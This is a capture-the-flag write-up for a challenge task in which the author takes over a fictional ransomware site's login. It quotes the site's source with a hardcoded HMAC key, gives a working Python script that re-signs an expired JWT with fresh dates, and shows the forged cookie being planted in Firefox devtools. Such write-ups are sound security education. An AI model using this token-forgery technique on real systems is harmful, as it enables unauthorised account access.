# Task 6 - Gaining Access

<div align="center">
<img src="https://img.shields.io/badge/categories-Web Hacking, [redacted]-informational">
<img src="https://img.shields.io/badge/points-150-success">
<img src="https://img.shields.io/badge/tools-Python-blueviolet">
</div>

> We've found the login page on the ransomware site, but we don't know anyone's username or password. Luckily, the file you recovered from the attacker's computer looks like it could be helpful.
>
> Generate a new token value which will allow you to access the ransomware site.
>
> Prompt:
>
> - Enter a token value which will authenticate you as a user of the site.

## Solution

To review, decrypting the file from task 5 yielded the following result:

```txt
# Netscape HTTP Cookie File
iulplkticahjbflq.ransommethis.net       FALSE   /       TRUE    2145916800      tok     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTM1OTMzMDgsImV4cCI6MTY1NjE4NTMwOCwic2VjIjoiMXVUMTUza1VITU1IcnFxcUVLYWswS1NxeVM0dmR3VGkiLCJ1aWQiOjI2OTYwfQ.sZsTU8onwizKjCuZj99coyuM7wY7QZSWllb9SMAt6BM
```

The last value in that file that starts with `eyJ0eX...` is the token submitted for task 5. I thought it looked kind of like a JSON Web Token (JWT), which was confirmed when I copied it into the JWT debugger on the [official JWT website](https://jwt.io/):

<div align="center">
<img src="./img/jwt%20debugger%20screenshot.png" alt="JWT debugger output">
</div>

The `iat` and `exp` fields are standard across JWTs and indicate when a token was issued and expires as a [Unix timestamp](https://en.wikipedia.org/wiki/Unix_time), respectively. `sec` and `uid` sound specific to this ransomware website, so I referenced the [website source](../task-B2/server-files/) obtained during task B2. Here are all of the functions relevant to token verification in both `app/server.py` and `app/util.py`:

```python
# server.py - lines 150-166
def pathkey_route(pathkey, path):
    # --snip--

    # Check if they're logged in.
    try:
        uid = util.get_uid()
    except util.InvalidTokenException:
        return redirect(f"/{pathkey}/login", 302)

# util.py

# lines 71-79
def get_uid():
    """ Gets the logged-in user's uid from their token, if it is valid """
    token = request.cookies.get('tok')
    if token == None:
        print("No token cookie found!", file=sys.stderr)
        raise MissingTokenException
    if not validate_token(token):
        raise InvalidTokenException
    return jwt.decode(token, hmac_key(), algorithms=['HS256'])['uid']

# lines 47-57
def validate_token(token):
    try:
        claims = jwt.decode(token, hmac_key(), algorithms=['HS256'])
    except:
        # Either invalid format, expired, or wrong key
        return False
    with userdb() as con:
        row = con.execute('SELECT secret FROM Accounts WHERE uid = ?', (claims['uid'],)).fetchone()
        if row is None:
            return False
        return row[0] == claims['sec']

# lines 43-44
def hmac_key():
    return "xqDxTAQBYw4hEsK8ud3ASezUM4IohDW1"
```

Hmm, pretty sure you're not supposed to store an HMAC key in plaintext :) That should be useful for forging a JWT login token though. I decided to use PyJWT to do this because I had trouble with the online debugger and it was easy to use. Essentially all that has to be done is update the `iat` and `exp` fields of the JWT to make it valid. The token signature also has to be updated to ensure that it's valid, but because of the HMAC key being stored in plaintext in the website source PyJWT does that for us. The script I used is located [in this folder](./forge_jwt.py), but I've included it here for reference as well since it isn't too long:

```python
import datetime

import jwt

EXPIRED = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTM1OTMzMDgsImV4cCI6MTY1NjE4NTMwOCwic2VjIjoiMXVUMTUza1VITU1IcnFxcUVLYWswS1NxeVM0dmR3VGkiLCJ1aWQiOjI2OTYwfQ.sZsTU8onwizKjCuZj99coyuM7wY7QZSWllb9SMAt6BM"

HMAC_KEY = "xqDxTAQBYw4hEsK8ud3ASezUM4IohDW1"

if __name__ == "__main__":
    # Don't verify if the key is expired (we know it is haha)
    expired_dec = jwt.decode(EXPIRED, HMAC_KEY, algorithms=["HS256"], options={"verify_exp": False})

    # Choose valid iat/exp dates
    now = datetime.datetime.now(tz=datetime.timezone.utc)
    expired_dec["iat"] = now
    expired_dec["exp"] = now + datetime.timedelta(days=365) # 1 year later for leeway

    print(jwt.encode(expired_dec, HMAC_KEY, algorithm='HS256'))
```

Looking back I'm note entirely sure why I specified UTC as a timezone since the website didn't do that. I assume PyJWT automatically converts the `datetime` objects to UTC timestamps?

Anyways, when I ran the script the following token was generated:

```txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjU4Njc4NjIsImV4cCI6MTY5NzQwMzg2Miwic2VjIjoiMXVUMTUza1VITU1IcnFxcUVLYWswS1NxeVM0dmR3VGkiLCJ1aWQiOjI2OTYwfQ.cz2HMiQvSgXGPKQmYsPO1YiyMX2-q7y7aE8nOFX3hK4
```

If you run the script you'll get a slightly different token since it's based on the current time. Submitting this token proves it to be a valid login token, although logging into the website itself probably wouldn't hurt.

## Impersonating our attacker

Bringing back the contents of the cookie file from task 5:

```txt
# Netscape HTTP Cookie File
iulplkticahjbflq.ransommethis.net       FALSE   /       TRUE    2145916800      tok     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTM1OTMzMDgsImV4cCI6MTY1NjE4NTMwOCwic2VjIjoiMXVUMTUza1VITU1IcnFxcUVLYWswS1NxeVM0dmR3VGkiLCJ1aWQiOjI2OTYwfQ.sZsTU8onwizKjCuZj99coyuM7wY7QZSWllb9SMAt6BM
```

Obviously this file includes more than just the login token. According to [this wiki page](http://fileformats.archiveteam.org/index.php?title=Netscape_cookies.txt#File_format), the different fields appear in the following order:

- host - the domain which set the cookie (`iulplkticahjbflq.ransommethis.net`)
- subdomains - "an early attempt at SameSite" according to the wiki page (`FALSE`)
- path - the path that owns the cookie (`/`)
- isSecure - whether a cookie should be HTTPS-only (`TRUE`)
- expiry - Unix timestamp of when cookie expires (`2145916800`; 2038-01-01T00:00:00Z, in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601) format)
- name - the name of the cookie (`tok`)
- value - the value of the cookie (`eyJ0eX...`)

In the "Storage" section of Firefox's devtools, you can modify a site's cookies and add new ones. I mostly just copied over the above fields, although they are named slightly differently:

<div align="center">
<img src="./img/key%20in%20firefox%20devtools.png" alt="forged JWT key cookie in firefox devtools">
</div>

Deleting the `/login` from the website URL confirms that this is a valid login (alongside the codebreaker website considering it correct, of course):

<div align="center">
<img src="./img/website%20homepage.png" alt="Ransomeware website homepage">
</div>

And we're in! Time to poke around to see what else we can do :)
